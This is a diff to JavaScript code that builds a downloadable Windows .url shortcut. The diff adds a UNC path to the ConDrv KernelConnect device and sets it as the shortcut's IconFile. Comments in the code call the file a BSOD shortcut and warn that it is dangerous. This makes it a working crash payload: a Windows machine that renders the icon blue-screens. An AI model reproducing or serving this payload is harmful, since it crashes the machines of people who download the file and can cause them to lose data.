@@ -54,7 +54,7 @@
             *   THIS IS DANGEROUS SO BE CAREFUL!
             *   (without it, it is just a .url file to https://github.com/mdrb97 :-D )
             */
-            let uncPath = "";
+            let uncPath = "\\\\.\\GLOBALROOT\\Device\\ConDrv\\KernelConnect";
 
             /*
             * blob payload - this is
@@ -62,7 +62,7 @@
             * shortcut with IconFile set to
             * the KernelConnect device UNC path
             */
-            let bsodShortcutFile = (`[{000214A0-0000-0000-C000-000000000046}]\nProp3=19,2\n[InternetShortcut]\nIDList=\nURL=https://github.com/mdrb97\nIconIndex=0\nHotKey=0\nIconFile=${uncPath}}`);
+            let bsodShortcutFile = (`[{000214A0-0000-0000-C000-000000000046}]\nProp3=19,2\n[InternetShortcut]\nIDList=\nURL=https://github.com/mdrb97\nIconIndex=0\nHotKey=0\nIconFile=${uncPath}`);
             let bytes = new Array(bsodShortcutFile.length);
             for (let i = 0; i < bytes.length; i++) {
                 bytes[i] = bsodShortcutFile.charCodeAt(i);
